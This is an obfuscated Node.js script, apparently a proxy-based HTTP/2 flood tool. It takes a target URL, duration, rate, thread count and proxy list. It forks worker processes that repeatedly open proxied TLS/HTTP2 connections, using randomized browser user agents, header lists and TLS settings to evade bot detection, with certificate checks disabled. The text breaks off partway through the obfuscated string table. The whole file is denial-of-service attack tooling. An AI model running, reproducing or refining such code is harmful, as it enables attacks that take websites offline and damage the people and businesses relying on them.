const _0x1d4549 = _0x47f2;
function _0x47f2(_0x7b1e09, _0x52cf16) {
  const _0x16f432 = _0x16f4();
  _0x47f2 = function (_0x47f281, _0x3f2689) {
    _0x47f281 = _0x47f281 - 0xa4;
    let _0x3e4818 = _0x16f432[_0x47f281];
    return _0x3e4818;
  };
  return _0x47f2(_0x7b1e09, _0x52cf16);
}
(function (_0x4dfd4a, _0x59f7fe) {
  const _0x1c942b = _0x47f2;
  const _0xc861e7 = _0x4dfd4a();
  while (true) {
    try {
      const _0x115fe1 = parseInt(_0x1c942b(0x11a)) / 0x1 * (parseInt(_0x1c942b(0x124)) / 0x2) + parseInt(_0x1c942b(0x152)) / 0x3 + -parseInt(_0x1c942b(0x12b)) / 0x4 + parseInt(_0x1c942b(0x156)) / 0x5 + parseInt(_0x1c942b(0x179)) / 0x6 * (-parseInt(_0x1c942b(0x126)) / 0x7) + parseInt(_0x1c942b(0x176)) / 0x8 * (parseInt(_0x1c942b(0xd2)) / 0x9) + -parseInt(_0x1c942b(0x11d)) / 0xa * (parseInt(_0x1c942b(0x166)) / 0xb);
      if (_0x115fe1 === _0x59f7fe) {
        break;
      } else {
        _0xc861e7.push(_0xc861e7.shift());
      }
    } catch (_0x9bc8b2) {
      _0xc861e7.push(_0xc861e7.shift());
    }
  }
})(_0x16f4, 0x42273);
const net = require(_0x1d4549(0xd9));
const http2 = require(_0x1d4549(0x11e));
const tls = require('tls');
const cluster = require(_0x1d4549(0x18a));
const url = require(_0x1d4549(0xa8));
const crypto = require(_0x1d4549(0xd3));
const fs = require('fs');
var colors = require(_0x1d4549(0xc0));
const randomUseragent = require(_0x1d4549(0xbb));
const uap = [_0x1d4549(0x180), _0x1d4549(0xa7), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", _0x1d4549(0x139), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", _0x1d4549(0x11b), _0x1d4549(0xf6), _0x1d4549(0x170), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", _0x1d4549(0x17b), _0x1d4549(0x114), _0x1d4549(0xac), _0x1d4549(0xde), "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", _0x1d4549(0xb7), _0x1d4549(0x187), "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", _0x1d4549(0x148), "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", _0x1d4549(0x193), _0x1d4549(0xcc), _0x1d4549(0x182), _0x1d4549(0x14b), _0x1d4549(0x12f), _0x1d4549(0x1a2), _0x1d4549(0x102), "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", _0x1d4549(0x14c), _0x1d4549(0x12a), "Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13", _0x1d4549(0x1ae), "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", _0x1d4549(0x183), _0x1d4549(0xe2), _0x1d4549(0xee), _0x1d4549(0x10f), _0x1d4549(0xb4), _0x1d4549(0x1a1), _0x1d4549(0x1a4), _0x1d4549(0x163), "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", _0x1d4549(0x160)];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', _0x1d4549(0x154), _0x1d4549(0xf3), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'];
const cache_header = [_0x1d4549(0xc1), _0x1d4549(0x1a3), _0x1d4549(0x164), _0x1d4549(0x120), _0x1d4549(0x191), 'must-revalidate', _0x1d4549(0x178), _0x1d4549(0xc6), _0x1d4549(0x1a9), _0x1d4549(0x105), _0x1d4549(0xb9)];
const Generate_Encoding = ['*', 'br', _0x1d4549(0x1ac), _0x1d4549(0x19e), _0x1d4549(0xad), "gzip, compress", _0x1d4549(0xa9), _0x1d4549(0xaa), _0x1d4549(0xf7), 'deflate'];
const language_header = ['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", 'en-US,en;q=0.5', _0x1d4549(0x174), _0x1d4549(0xe5), _0x1d4549(0x149), _0x1d4549(0x10a), 'nl-NL,nl;q=0.9', _0x1d4549(0xce), 'or-IN,or;q=0.9', _0x1d4549(0xd6), _0x1d4549(0xaf), _0x1d4549(0x13a), _0x1d4549(0xb1), _0x1d4549(0xe9), _0x1d4549(0xc5), 'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', _0x1d4549(0xcb), _0x1d4549(0x16a), _0x1d4549(0x190), _0x1d4549(0xd1), _0x1d4549(0x17f), 'sw-KE,sw;q=0.9', _0x1d4549(0x150), _0x1d4549(0x113), 'th-TH,th;q=0.9', _0x1d4549(0x18b), _0x1d4549(0xe3), 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', _0x1d4549(0x1a0), _0x1d4549(0x122), _0x1d4549(0x118), 'zh-TW,zh;q=0.9', _0x1d4549(0xb3), 'as-IN,as;q=0.8', 'az-Cyrl-AZ,az;q=0.8', _0x1d4549(0xd0), _0x1d4549(0x103), _0x1d4549(0x1ab), _0x1d4549(0x1a5), _0x1d4549(0xea), 'fr-CA,fr;q=0.8', _0x1d4549(0x143), _0x1d4549(0xfd), 'fr-LU,fr;q=0.8', _0x1d4549(0x189), _0x1d4549(0x106), _0x1d4549(0xfc), _0x1d4549(0x107), _0x1d4549(0xd7), _0x1d4549(0x196), 'jv-Latn-ID,jv;q=0.8', _0x1d4549(0xc2), _0x1d4549(0x155), _0x1d4549(0xe8), _0x1d4549(0x168), _0x1d4549(0xf0), _0x1d4549(0x151), 'lb-LU,lb;q=0.8', 'ln-CG,ln;q=0.8', _0x1d4549(0x100), _0x1d4549(0xb0), _0x1d4549(0xf5), _0x1d4549(0x134), 'mua-CM,mua;q=0.8', _0x1d4549(0xda), _0x1d4549(0x121), _0x1d4549(0x14d), _0x1d4549(0x13e), 'pa-Arab-PK,pa;q=0.8', _0x1d4549(0x141), _0x1d4549(0xc9), 'quz-EC,quz;q=0.8', _0x1d4549(0x15f), _0x1d4549(0x119), _0x1d4549(0xa6), _0x1d4549(0x15e), 'se-NO,se;q=0.8', _0x1d4549(0x104), _0x1d4549(0x147), 'sms-FI,sms;q=0.8', _0x1d4549(0xb6), _0x1d4549(0x12c), _0x1d4549(0x185), _0x1d4549(0x125), _0x1d4549(0xbf), _0x1d4549(0xff), _0x1d4549(0x16d), _0x1d4549(0xba), _0x1d4549(0xc3), _0x1d4549(0xd5), _0x1d4549(0xfe), _0x1d4549(0xd4), _0x1d4549(0x140), 'zu-ZA,zu;q=0.8'];
const dest_header = [_0x1d4549(0x144), _0x1d4549(0x142), 'document', _0x1d4549(0x13f), _0x1d4549(0x15a), _0x1d4549(0x17c), _0x1d4549(0x184), _0x1d4549(0x16c), _0x1d4549(0xcd), 'manifest', _0x1d4549(0x18f), _0x1d4549(0xc7), _0x1d4549(0xbe), 'script', _0x1d4549(0x17d), _0x1d4549(0x11c), _0x1d4549(0x1ad), _0x1d4549(0x137), _0x1d4549(0xeb), _0x1d4549(0x145), _0x1d4549(0x123)];
const platform = ['Windows', _0x1d4549(0x129), _0x1d4549(0x12d)];
const mode_header = [_0x1d4549(0x16e), _0x1d4549(0x199), _0x1d4549(0x136), _0x1d4549(0x10e), 'websocket'];
const site_header = ['cross-site', _0x1d4549(0x10e), _0x1d4549(0x18d), _0x1d4549(0x101)];
const sec_ch_ua = [_0x1d4549(0xe4), "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\""];
process[_0x1d4549(0x128)](0x0);
require(_0x1d4549(0x16b)).EventEmitter.defaultMaxListeners = 0x0;
if (process[_0x1d4549(0x111)][_0x1d4549(0x181)] < 0x7) {
  console.log("Usage: host time req thread GET proxy.txt");
  process[_0x1d4549(0x135)]();
}
const defaultCiphers = crypto[_0x1d4549(0x146)][_0x1d4549(0x188)][_0x1d4549(0x19f)](':');
const ciphers = _0x1d4549(0x115) + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], ...defaultCiphers.slice(0x3)][_0x1d4549(0x13b)](':');
const sigalgs = [_0x1d4549(0x14f), _0x1d4549(0x19b), 'ecdsa_secp521r1_sha512', _0x1d4549(0x171), 'rsa_pss_rsae_sha384', _0x1d4549(0xd8), 'rsa_pkcs1_sha256', _0x1d4549(0xa4), _0x1d4549(0x108)];
let SignalsList = sigalgs[_0x1d4549(0x13b)](':');
const ecdhCurve = _0x1d4549(0x10d);
_0x1d4549(0xf4);
const secureOptions = crypto.constants[_0x1d4549(0x19a)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x10c)] | crypto.constants[_0x1d4549(0x112)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x192)] | crypto[_0x1d4549(0x146)].ALPN_ENABLED | crypto[_0x1d4549(0x146)].SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants[_0x1d4549(0x17e)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x195)] | crypto.constants[_0x1d4549(0x110)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x17a)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x165)] | crypto[_0x1d4549(0x146)][_0x1d4549(0xb5)] | crypto[_0x1d4549(0x146)][_0x1d4549(0x175)] | crypto[_0x1d4549(0x146)][_0x1d4549(0xdc)];
const secureProtocol = _0x1d4549(0xf1);
const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': SignalsList,
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': secureProtocol
};
const secureContext = tls[_0x1d4549(0xab)](secureContextOptions);
const args = {
  'target': process[_0x1d4549(0x111)][0x2],
  'time': ~~process[_0x1d4549(0x111)][0x3],
  'Rate': ~~process[_0x1d4549(0x111)][0x4],
  'threads': ~~process[_0x1d4549(0x111)][0x5],
  'method': ~~process.argv[0x6],
  'proxyFile': process.argv[0x7]
};
var proxies = fs.readFileSync(args.proxyFile, _0x1d4549(0x162)).toString().split(/\r?\n/);
const parsedTarget = url[_0x1d4549(0xb2)](args[_0x1d4549(0x16f)]);
if (cluster[_0x1d4549(0x1a6)]) {
  for (let counter = 0x1; counter <= args[_0x1d4549(0x12e)]; counter++) {
    cluster[_0x1d4549(0x158)]();
  }
} else {
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  [_0x1d4549(0xdb)](_0x3ea1c5, _0xdee760) {
    const _0x14364b = _0x1d4549(0xca) + _0x3ea1c5.address + _0x1d4549(0x130) + _0x3ea1c5.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x2282c4 = new Buffer[_0x1d4549(0xcf)](_0x14364b);
    const _0x536df2 = net.connect({
      'host': _0x3ea1c5[_0x1d4549(0xe7)],
      'port': _0x3ea1c5[_0x1d4549(0x1af)],
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x536df2[_0x1d4549(0x13d)](_0x3ea1c5[_0x1d4549(0x131)] * 0x2710);
    _0x536df2[_0x1d4549(0x133)](true, 0xc350);
    _0x536df2.setNoDelay(true);
    _0x536df2.on(_0x1d4549(0x15d), () => {
      _0x536df2[_0x1d4549(0x14a)](_0x2282c4);
    });
    _0x536df2.on(_0x1d4549(0x1b1), _0x4f6a1d => {
      const _0x551b69 = _0x4f6a1d.toString(_0x1d4549(0x162));
      const _0x20fd62 = _0x551b69[_0x1d4549(0xdf)](_0x1d4549(0x116));
      if (_0x20fd62 === false) {
        _0x536df2[_0x1d4549(0xc8)]();
        return _0xdee760(undefined, _0x1d4549(0xa5));
      }
      return _0xdee760(_0x536df2, undefined);
    });
    _0x536df2.on(_0x1d4549(0x131), () => {
      _0x536df2[_0x1d4549(0xc8)]();
      return _0xdee760(undefined, "error: timeout exceeded");
    });
    _0x536df2.on(_0x1d4549(0x19c), _0x2e4c4c => {
      _0x536df2[_0x1d4549(0xc8)]();
      return _0xdee760(undefined, "error: " + _0x2e4c4c);
    });
  }
}
function cookieString(_0xab73f4) {
  var _0x4b456d = '';
  for (var _0x327860 in _0xab73f4) {
    _0x4b456d = _0x4b456d + " " + _0xab73f4[_0x327860].name + '=' + _0xab73f4[_0x327860][_0x1d4549(0xf8)] + ';';
  }
  var _0x4b456d = _0x4b456d[_0x1d4549(0x11f)](0x1);
  return _0x4b456d[_0x1d4549(0x11f)](0x0, _0x4b456d[_0x1d4549(0x181)] - 0x1);
}
const Socker = new NetSocket();
function readLines(_0xf55b75) {
  return fs.readFileSync(_0xf55b75, _0x1d4549(0x162)).toString().split(/\r?\n/);
}
function randomIntn(_0x1d4562, _0x130e1e) {
  return Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * (_0x130e1e - _0x1d4562) + _0x1d4562);
}
function randomElement(_0x14ab3d) {
  return _0x14ab3d[Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * (_0x14ab3d[_0x1d4549(0x181)] - 0x0) + 0x0)];
}
function getRandomUserAgent() {
  const _0x50faac = [_0x1d4549(0x15c), _0x1d4549(0x117), "Windows NT 6.1", "Windows NT 6.3", 'Macintosh', _0x1d4549(0xc4), _0x1d4549(0x129)];
  const _0xb322b5 = [_0x1d4549(0xb8), _0x1d4549(0xef), 'Safari', _0x1d4549(0xf9), _0x1d4549(0x194)];
  const _0xc24a8f = [_0x1d4549(0x198), 'en-GB', _0x1d4549(0x167), _0x1d4549(0x197), _0x1d4549(0x159)];
  const _0x58a54b = ['US', 'GB', 'FR', 'DE', 'ES'];
  const _0x320aad = ['Windows', _0x1d4549(0xfb), _0x1d4549(0x109), _0x1d4549(0xed), _0x1d4549(0xbc), "Opera Software"];
  const _0x49fda8 = _0x50faac[Math[_0x1d4549(0xf2)](Math.random() * _0x50faac[_0x1d4549(0x181)])];
  const _0x19d0ea = _0xb322b5[Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * _0xb322b5.length)];
  const _0x248d37 = _0xc24a8f[Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * _0xc24a8f[_0x1d4549(0x181)])];
  const _0x239fef = _0x58a54b[Math[_0x1d4549(0xf2)](Math.random() * _0x58a54b[_0x1d4549(0x181)])];
  const _0x2398ea = _0x320aad[Math[_0x1d4549(0xf2)](Math.random() * _0x320aad[_0x1d4549(0x181)])];
  const _0x304cec = Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * 0x64) + 0x1;
  const _0xf802a7 = Math[_0x1d4549(0xf2)](Math.random() * 0x6) + 0x1;
  const _0x15e2d2 = _0x2398ea + '/' + _0x19d0ea + " " + _0x304cec + '.' + _0x304cec + '.' + _0x304cec + " (" + _0x49fda8 + "; " + _0x239fef + "; " + _0x248d37 + ')';
  const _0x472211 = btoa(_0x15e2d2);
  let _0x209dd0 = '';
  for (let _0x13e6f2 = 0x0; _0x13e6f2 < _0x472211[_0x1d4549(0x181)]; _0x13e6f2++) {
    if (_0x13e6f2 % _0xf802a7 === 0x0) {
      _0x209dd0 += _0x472211.charAt(_0x13e6f2);
    } else {
      _0x209dd0 += _0x472211[_0x1d4549(0xe1)](_0x13e6f2)[_0x1d4549(0x18e)]();
    }
  }
  return _0x209dd0;
}
function runFlooder() {
  const _0x2a30bc = proxies[Math[_0x1d4549(0xf2)](Math[_0x1d4549(0x10b)]() * (proxies[_0x1d4549(0x181)] - 0x0) + 0x0)];
  const _0x224174 = _0x2a30bc.split(':');
  const _0x2a70f7 = parsedTarget[_0x1d4549(0x132)] == _0x1d4549(0x157) ? '443' : '80';
  const _0x4108e0 = {
    'host': _0x224174[0x0],
    'port': ~~_0x224174[0x1],
    'address': parsedTarget[_0x1d4549(0xe7)] + ':443',
    'timeout': 0x64
  };
  Socker.HTTP(_0x4108e0, (_0x3f5c90, _0x26bdc3) => {
    if (_0x26bdc3) {
      return;
    }
    _0x3f5c90.setKeepAlive(true, 0xea60);
    _0x3f5c90[_0x1d4549(0xec)](true);
    const _0x44c37b = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x41e01c = {
      'port': _0x2a70f7,
      'secure': true,
      'ALPNProtocols': ['h2', _0x1d4549(0x1aa), _0x1d4549(0xbd), _0x1d4549(0xe6)],
      'ciphers': ciphers,
      'sigalgs': sigalgs,
      'requestCert': true,
      'socket': _0x3f5c90,
      'ecdhCurve': ecdhCurve,
      'honorCipherOrder': false,
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'clientCertEngine': _0x1d4549(0x177),
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'servername': parsedTarget[_0x1d4549(0xe7)],
      'secureProtocol': secureProtocol
    };
    const _0x3c078e = tls[_0x1d4549(0x15d)](_0x2a70f7, parsedTarget[_0x1d4549(0xe7)], _0x41e01c);
    _0x3c078e.allowHalfOpen = true;
    _0x3c078e[_0x1d4549(0xec)](true);
    _0x3c078e[_0x1d4549(0x133)](true, 60000);
    _0x3c078e[_0x1d4549(0x128)](0x0);
    const _0x14f2ca = http2[_0x1d4549(0x15d)](parsedTarget.href, {
      'protocol': _0x1d4549(0x157),
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x64,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x3c078e,
      'socket': _0x3f5c90
    });
    _0x14f2ca[_0x1d4549(0x161)]({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x64,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x14f2ca.setMaxListeners(0x0);
    _0x14f2ca[_0x1d4549(0x161)](_0x44c37b);
    _0x14f2ca.on(_0x1d4549(0x15d), () => {});
    _0x14f2ca.on(_0x1d4549(0xfa), () => {
      _0x14f2ca[_0x1d4549(0xc8)]();
      _0x3f5c90[_0x1d4549(0xc8)]();
      return;
    });
    _0x14f2ca.on(_0x1d4549(0x19c), _0x4b837f => {
      _0x14f2ca[_0x1d4549(0xc8)]();
      _0x3f5c90[_0x1d4549(0xc8)]();
      return;
    });
  });
}
function _0x16f4() {
  const _0x4b2e6e = ['tg-Cyrl-TJ,tg;q=0.8', 'iPhone', 'threads', "Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36", ":443 HTTP/1.1\r\nHost: ", 'timeout', 'protocol', 'setKeepAlive', 'mt-MT,mt;q=0.8', 'exit', 'no-cors', 'track', 'clear', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", 'pt-BR,pt;q=0.9', 'join', 'Rate', 'setTimeout', 'oc-FR,oc;q=0.8', 'embed', 'zgh-MA,zgh;q=0.8', 'ps-AF,ps;q=0.8', 'audioworklet', 'fr-CH,fr;q=0.8', 'audio', 'worker', 'constants', 'smn-FI,smn;q=0.8', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "da, en-gb;q=0.8, en;q=0.7", 'write', "Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", 'nso-ZA,nso;q=0.8', 'address', 'ecdsa_secp256r1_sha256', 'ta-IN,ta;q=0.9', 'ks-Arab-IN,ks;q=0.8', '1180275YYDHwD', 'getRandom', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'kkj-CM,kkj;q=0.8', '2129510uceyiv', 'https:', 'fork', 'es-ES', 'empty', 'log', 'Windows', 'connect', 'sd-Arab-PK,sd;q=0.8', 'quz-PE,quz;q=0.8', "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1", 'settings', 'utf-8', "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", 'no-store', 'SSL_OP_PKCS1_CHECK_2', '22aPNJOR', 'fr-FR', 'km-KH,km;q=0.8', 'path', 'sq-AL,sq;q=0.9', 'events', 'iframe', 'ug-CN,ug;q=0.8', 'cors', 'target', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", 'rsa_pss_rsae_sha256', 'uncaughtException', 'bgRed', 'en-US,en;q=0.9', 'SSL_OP_SINGLE_ECDH_USE', '69008ZIswYl', 'DYNAMIC', 'proxy-revalidate', '6AnEzZC', 'SSL_OP_PKCS1_CHECK_1', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", 'font', 'serviceworker', 'SSL_OP_CIPHER_SERVER_PREFERENCE', 'sv-SE,sv;q=0.9', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", 'length', "Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1", 'frame', 'ti-ER,ti;q=0.8', 'set-cookie', "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", 'defaultCoreCipherList', 'gsw-CH,gsw;q=0.8', 'cluster', 'tr-TR,tr;q=0.9', 'request', 'same-site', 'toUpperCase', 'object', 'sr-Cyrl-RS,sr;q=0.9', 'post-check=0', 'SSL_OP_NO_TLSv1_1', "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", 'Opera', 'SSL_OP_LEGACY_SERVER_CONNECT', 'is-IS,is;q=0.8', 'de-DE', 'en-US', 'navigate', 'SSL_OP_NO_SSLv2', 'ecdsa_secp384r1_sha384', 'error', 'response', "br;q=1.0, gzip;q=0.8, *;q=0.1", 'split', 'vi-VN,vi;q=0.9', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36", 'no-cache', "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", 'dz-BT,dz;q=0.8', 'isMaster', 'time', 'https', "no-cache, no-store,private, max-age=0, must-revalidate", 'spdy/3.1', 'bs-Latn-BA,bs;q=0.8', "gzip, deflate", 'style', "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420", 'port', 'unhandledRejection', 'data', 'rsa_pkcs1_sha384', "error: invalid response from proxy server", 'rw-RW,rw;q=0.8', "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", 'url', "compress, deflate", 'compress', 'createSecureContext', "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", 'gzip', 'browserName', 'pl-PL,pl;q=0.9', 'mr-MN,mr;q=0.8', 'pt-PT,pt;q=0.9', 'parse', 'am-ET,am;q=0.8', "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", 'SSL_OP_SINGLE_DH_USE', 'syr-SY,syr;q=0.8', "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", 'Chrome', "no-cache, no-store,private, max-age=604800, must-revalidate", 'uz-Cyrl-UZ,uz;q=0.8', 'random-useragent', 'Mozilla', 'http/1.1', 'report', 'tn-ZA,tn;q=0.8', 'colors', 'max-age=0', 'ka-GE,ka;q=0.8', 've-ZA,ve;q=0.8', 'Android', 'ru-RU,ru;q=0.9', 's-maxage=604800', 'paintworklet', 'destroy', 'quz-BO,quz;q=0.8', "CONNECT ", 'sl-SI,sl;q=0.9', "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", 'image', 'nn-NO,nn;q=0.9', 'from', 'bn-BD,bn;q=0.8', 'sr-Latn-RS,sr;q=0.9', '342BbWpuC', 'crypto', 'yo-NG,yo;q=0.8', 'wo-SN,wo;q=0.8', 'pa-IN,pa;q=0.9', 'ii-CN,ii;q=0.8', 'rsa_pss_rsae_sha512', 'net', 'nds-DE,nds;q=0.8', 'HTTP', 'SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION', 'cloudflare', "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", 'includes', '@Bettercallcrisxtop', 'charAt', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", 'uk-UA,uk;q=0.9', "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"", 'de-CH;q=0.7', 'h2c', 'host', 'kl-GL,kl;q=0.8', 'ro-RO,ro;q=0.9', 'fil-PH,fil;q=0.8', 'video', 'setNoDelay', 'Microsoft', "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", 'Firefox', 'kok-IN,kok;q=0.8', 'TLS_client_method', 'floor', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'GREASE:X25519:x25519:P-256:P-384:P-521:X448', 'ms-BN,ms;q=0.8', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "gzip, deflate, br", 'value', 'Edge', 'close', 'Apple', 'hr-BA,hr;q=0.8', 'fr-BE,fr;q=0.8', 'xh-ZA,xh;q=0.8', 'tt-RU,tt;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'none', "Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36", 'bs-Cyrl-BA,bs;q=0.8', 'si-LK,si;q=0.8', "no-cache, no-store,private, s-maxage=604800, must-revalidate", 'ha-Latn-NG,ha;q=0.8', 